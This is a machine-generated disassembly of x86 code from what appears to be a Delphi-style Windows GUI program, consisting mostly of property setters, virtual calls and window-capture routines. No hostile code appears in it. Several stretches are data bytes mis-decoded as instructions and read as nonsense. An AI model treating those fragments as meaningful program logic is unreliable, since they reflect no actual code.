retn
mov [ eax + 0x1ab ] dl
mov edx eax
call sub_3a9bb18
sub_3a9bb00
cmp dl [ eax + 0x1ad ]
je r-xdata
retn
mov [ eax + 0x1ad ] dl
mov edx eax
call sub_3a9bb18
sub_3a9bd18
push esi
mov esi eax
cmp dl [ esi + 0x198 ]
je r-xdata
pop esi
retn
mov [ esi + 0x198 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a9bd38
push esi
mov esi eax
cmp dl [ esi + 0x199 ]
je r-xdata
pop esi
retn
mov [ esi + 0x199 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a9c1d2
jmp sub_3a648a0
sub_3a9c28b
jmp sub_3a64b54
sub_3a9c292
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9c2a8
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_3a9c20c
sub_3a9c2b8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_3a9c20c
pop ebp
retn 0x8
sub_3a9c2d0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3a9c410
push esi
mov esi eax
mov eax esi
call sub_3ab71e0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_3a9c428
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_3a9c460
cmp [ eax + 0x266 ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_3a9c567
jmp sub_3a64b54
sub_3a9c56e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9c72f
jmp sub_3a64b54
sub_3a9c736
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9c740
mov [ eax + 0x268 ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_3a9c750
push ebx
mov ebx eax
mov [ ebx + 0x259 ] dl
mov eax ebx
call sub_3ab36e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_3a9c76c
push ebx
mov ebx eax
mov [ ebx + 0x25a ] dl
mov eax ebx
call sub_3ab36e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_3a9c788
push ebx
mov ebx eax
mov [ ebx + 0x25c ] edx
mov eax ebx
call sub_3ab36e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_3a9c7a4
push ebx
mov ebx eax
mov [ ebx + 0x260 ] edx
mov eax ebx
call sub_3ab36e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_3a9c7c0
cmp dl [ eax + 0x264 ]
je r-xdata
retn
mov [ eax + 0x264 ] dl
call sub_3ab4518
sub_3a9c7d4
movzx eax [ eax + 0x268 ]
retn
sub_3a9c93e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
retn
sub_3a9c956
jmp sub_3a64b54
sub_3a9c9d8
mov [ eax + 0x269 ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_3a9ca0d
jmp sub_3a64b54
sub_3a9ca14
pop ebp
retn
sub_3a9ca18
0x3a9
sub_3a9ca1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul st2
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax - 0x37fc5636 ] ch
0x3a9
sub_3a9caba
test eax 0xa9e94003
add edx [ eax ]
0xea2403a9 0x3a9
sub_3a9cebc
jmp r-xdata
sub_3a9cebe
0xc4ffe9ff 0xa9f3
sub_3a9cec5
add esi eax
test eax 0xa9f41003
add esi [ eax ]
hlt
sub_3a9dabc
jmp r-xdata
sub_3a9dabe
0xe8ffe9ff 0xe7ff
sub_3a9dac5
jmp esi
sub_3a9e788
call sub_3a64380
retn
sub_3a9e8e6
jmp sub_3a648a0
sub_3a9e8eb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9e908
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_3a9e910
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_3a6457c
pop esi
retn
sub_3a9e928
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_3a6457c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_3a9e940
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_3a9e9c4
jmp sub_3a64b54
sub_3a9e9fd
jmp sub_3a64b54
sub_3a9ea04
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9ea10
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_3a9ea24
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_3a9ed46
jmp sub_3a64b54
sub_3a9ed4d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9ef20
jmp sub_3a64b54
sub_3a9ef27
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9ef30
mov [ ecx ] 0x1
retn
sub_3a9efb1
jmp sub_3a64b54
sub_3a9efb8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a9f018
jmp sub_3a64b54
sub_3a9f01f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9f091
jmp sub_3a64b54
sub_3a9f098
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9f0a0
push ebx
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x50 ]
mov [ edx + 0x6c ] ecx
mov ebx edx
mov edx [ eax + 0x8 ]
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
pop ebx
retn
sub_3a9f0c0
push ebx
mov ebx eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa0210
mov [ eax + 0x74 ] ebx
mov [ eax + 0x70 ] sub_3a9f0e0
pop ebx
retn
sub_3a9f3f0
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_3a9f410
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_3a9f430
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_3a9f482
jmp sub_3a64b54
sub_3a9f489
pop ecx
pop ebp
retn
sub_3a9f5f2
jmp sub_3a64b54
sub_3a9f8d6
jmp sub_3a64b54
sub_3a9f8dd
mov eax [ ebp - 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9fa38
jmp sub_3a64b54
sub_3a9fa3f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a9fb09
jmp sub_3a64b54
sub_3a9fb10
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9fbc8
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x6c ]
retn
mov eax [ eax + 0x70 ]
retn
sub_3a9fc54
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_3a9fd84
jmp sub_3a64b54
sub_3a9fd8b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9fe30
jmp sub_3a64b54
sub_3a9fe37
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9fe40
push ebx
mov ebx eax
mov eax ebx
call sub_3a7b0ac
pop ebx
retn
sub_3a9feb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7b224
pop esi
pop ebx
retn
sub_3a9ff0c
mov edx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
call sub_3a9ff6c
retn
sub_3a9ff18
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_3a7b21c
dec eax
cmp eax [ ebx + 0x4 ]
setg al
test al al
je r-xdata
pop ebx
retn
inc [ ebx + 0x4 ]
sub_3a9ff5c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a9fec8
retn
sub_3a9ff6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7b224
pop esi
pop ebx
retn
sub_3a9ff81
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa00b8
sub_3a9ff8b
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa010c
sub_3a9ff95
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa00e0
sub_3a9ff9f
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa0170
sub_3a9ffa9
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa01b0
sub_3a9ffb3
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa01e4
sub_3a9ffbd
add [ esp + 0x4 ] 0xffffffec
jmp sub_3aa013c
sub_3a9ffd1
add [ esp + 0x4 ] 0xffffffec
jmp sub_3a66d88
sub_3a9ffdb
add [ esp + 0x4 ] 0xffffffec
jmp sub_3a66d9c
sub_3a9ffe6
[ ecx - 0x56002efd ]
sub_3a9ffec
add ebx ebx
[ ecx - 0x56007efd ]
sub_3a9fff4
add ecx [ ebx - 0x6afc5601 ]
[ ecx - 0x560060fd ]
sub_3aa0000
add ebp [ ecx - 0x4cfc5601 ]
[ ecx - 0x560042fd ]
sub_3aa0090
test dl dl
je r-xdata
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aa02f8
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_3aa032c
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_3aa0378
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_3aa0398
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_3aa03b8
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_3aa03d8
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_3aa079f
jmp sub_3a64b54
sub_3aa0851
jmp sub_3a64b54
sub_3aa087f
jmp sub_3a64b54
sub_3aa0886
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
add eax 0x3c
call sub_3a66cb4
retn
sub_3aa089f
jmp sub_3a64b54
sub_3aa08fb
jmp sub_3a64b54
sub_3aa0902
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa0913
jmp [ esi ]
sub_3aa0a5a
jmp sub_3a64b54
sub_3aa0a61
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa0a68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3aa0a7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x44 ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3aa0ba0
jmp sub_3a64b54
sub_3aa0ba7
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa0bb0
mov eax [ eax + 0x4c ]
retn
sub_3aa0c38
jmp sub_3a64b54
sub_3aa0c55
jmp sub_3a64b54
sub_3aa0c5c
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa0d00
jmp sub_3a64b54
sub_3aa0d07
pop ebx
pop ecx
pop ebp
retn
sub_3aa0daa
jmp sub_3a64b54
sub_3aa0db1
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa0e88
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x54 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_3aa0e9c
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_3aa0f3e
jmp sub_3a64b54
sub_3aa0f45
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa1031
jmp sub_3a64b54
sub_3aa1038
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa10ee
jmp sub_3a64b54
sub_3aa10f5
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa151a
jmp sub_3a64b54
sub_3aa1521
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa154b
lea eax [ ebp - 0x28 ]
call sub_3a652a0
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3aa1544
jmp sub_3a64b54
sub_3aa154b
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa172f
jmp sub_3a64b54
sub_3aa1736
pop ebp
retn
sub_3aa1769
jmp sub_3a64b54
sub_3aa1770
pop ebp
retn
sub_3aa1ba9
jmp sub_3a64b54
sub_3aa1bb0
pop ebp
retn
sub_3aa2abf
jmp [ eax + eax ]
sub_3aa2b20
mov eax [ esp + 0x8 ]
retn
sub_3aa2b28
push ebx
mov ebx eax
call sub_3aa2b20
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
jmp sub_3a64c34
sub_3aa2b44
pop ebx
retn
sub_3aa2db3
jmp sub_3a64b54
sub_3aa2dba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa2f77
jmp sub_3a64b54
sub_3aa2f7e
movzx eax [ ebp - 0x6 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa2f98
push ebx
mov eax [ rw-data ]
call sub_3a7aa2c
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_3a7aa00
mov eax ebx
pop ebx
retn
sub_3aa3128
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_3aa3144
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_3aa3896
jmp sub_3a64b54
sub_3aa389d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa3992
jmp sub_3a64b54
sub_3aa3999
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa3dc8
jmp sub_3a64b54
sub_3aa3dcf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3aa3fe9
jmp sub_3a64b54
sub_3aa3ff0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3aa4943
jmp sub_3a64b54
sub_3aa494a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa4df0
jmp sub_3a64b54
sub_3aa52ba
jmp sub_3a64b54
sub_3aa52c1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa576c
jmp sub_3a64b54
sub_3aa5c52
jmp sub_3a64b54
sub_3aa5c59
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa6255
jmp sub_3a64b54
sub_3aa625c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa64c8
jmp sub_3a64b54
sub_3aa64cf
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3aa64db
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa668c
mov eax [ r-xdata ]
retn
sub_3aa66c8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa66dc
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa66ec
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa66fc
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_3aa69fc
mov edx eax
sub_3aa6794
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_3a64530
mov edx esi
call sub_3aa6714
pop esi
pop ebx
retn
sub_3aa6810
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_3aa69fc
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_3a7a4f0
mov ecx eax
sub_3aa6bec
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_3aa6c54
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_3aa7004
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_3aa7038
sub_3aa7038
mov edx sub_3aa7010
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_3aa301c
retn
sub_3aa7243
jmp sub_3a64b54
sub_3aa724a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa76d1
jmp sub_3a64b54
sub_3aa7708
jmp sub_3a64b54
sub_3aa770f
movzx eax [ ebp - 0x26 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa78b0
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa79bc
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa34b4
retn
sub_3aa7a04
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_3a6457c
pop esi
pop ebp
retn 0x8
sub_3aa7a20
mov eax [ eax + 0x34 ]
call sub_3aa3b48
retn
sub_3aa7a2c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_3a6457c
pop esi
retn
sub_3aa7a68
push ebx
mov ecx sub_3aa7a40
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_3aa301c
pop ebx
retn
sub_3aa7c9c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_3aa7d9c
jmp sub_3a64b54
sub_3aa7da3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa7dc0
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3aa7db9
jmp sub_3a64b54
sub_3aa7dc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa7dea
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aa7de3
jmp sub_3a64b54
sub_3aa7dea
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa7ee0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_3aa8016
jmp sub_3a648a0
sub_3aa80ec
jmp sub_3a64b54
sub_3aa8117
jmp sub_3a64b54
sub_3aa8138
movzx eax [ eax + 0x41 ]
xor al 0x1
retn
sub_3aa832c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_3aa7a68
sub_3aa83b0
jmp sub_3a64b54
sub_3aa83f4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_3aa840c
push ebx
mov ebx eax
mov eax ebx
call sub_3a83acc
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_3aa845e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_3aa7a68
sub_3aa84d4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_3aa8673
jmp sub_3a64b54
sub_3aa867a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3aa88c0
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_3aa88d0
sub_3aa8924
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
movzx eax [ eax + rw-data ]
retn
sub_3aa8934
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_3aa8948
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
movzx eax [ eax + rw-data ]
retn
sub_3aa8958
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_3aa896c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call __imp_SendMessageA
sub_3aa89e8
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_3aa39a0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_3aa39a0
retn
sub_3aa8a04
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_3aa39a0
sub_3aa8a4c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_3aa7a20
retn
mov eax edx
retn
sub_3aa8a86
jmp sub_3a648a0
sub_3aa8a8b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa8df2
jmp sub_3a64b54
sub_3aa8df9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_3a64380
retn
sub_3aa8e0f
jmp sub_3a64b54
sub_3aa8f10
jmp sub_3a64b54
sub_3aa8f17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa8f34
mov eax [ ebp - 0x14 ]
call sub_3a64380
retn
sub_3aa8f2d
jmp sub_3a64b54
sub_3aa8f52
jmp sub_3a64b54
sub_3aa8fdc
jmp sub_3a64b54
sub_3aa8fe3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa9014
push ebx
mov ebx eax
mov eax ebx
call sub_3a7a630
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_3a84894
sub_3aa90d8
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_3aa90ec
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_3aa90f4
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_3aa9583
jmp sub_3a64b54
sub_3aa958a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa968c
jmp sub_3a64b54
sub_3aa9693
pop ebp
retn
sub_3aa9777
add edx [ eax - 0x33 ]
stosb [ edi ]
add ecx [ ebp + ecx * 8 - 0x56 ]
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add eax [ eax - 0x1ffc5535 ]

sub_3aaac9a
jmp r-xdata
sub_3aaac9c
0xe8ffe9ff 0xe7ff
sub_3aaaca3
jmp esi
sub_3aab893
add ebp [ eax - 0x53fc5515 ]
jmp sub_3aab845
sub_3aabf61
add eax 0xffffff88
jmp sub_3aba6e4
sub_3aabf69
add eax 0xffffff88
jmp sub_3aba6e8
sub_3aabf71
add eax 0xffffff88
jmp sub_3aba7d4
sub_3aabf79
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_3aabf86
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x10 ]
xchg [ esp ] eax
retn
sub_3aabf93
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x48 ]
xchg [ esp ] eax
retn
sub_3aabfa0
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x24 ]
xchg [ esp ] eax
retn
sub_3aabfad
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x2c ]
xchg [ esp ] eax
retn
sub_3aabfba
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
xchg [ esp ] eax
retn
sub_3aabfc7
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
xchg [ esp ] eax
retn
sub_3aabfd4
add eax 0xffffff88
jmp sub_3abc168
sub_3aabfe6
add [ esp + 0x4 ] 0xffffff88
jmp sub_3a66d88
sub_3aabff0
add [ esp + 0x4 ] 0xffffff88
jmp sub_3a66d9c
sub_3aac0b8
test ah cl
stosd [ edi ]
add edx esp
int3
sub_3aac488
movzx edx [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_3aac823
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_3a79db4
retn
sub_3aac840
push 0x15
mov ecx rw-data
call sub_3a79d74
retn
sub_3aac92c
call GetCapture
call sub_3aac5e0
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_3aacbc0
push ebx
push eax
push sub_3aacd78
call sub_3a847e0
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_3aacbd8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_3aacc08
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_3a84894
pop ebx
retn
sub_3aacd1b
jmp sub_3a648a0
sub_3aacd4c
xor eax eax
retn
sub_3aacd50
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_3aacd68
retn
sub_3aacd6c
mov eax [ rw-data ]
retn
sub_3aacd74
retn
sub_3aacda2
jmp sub_3a648a0
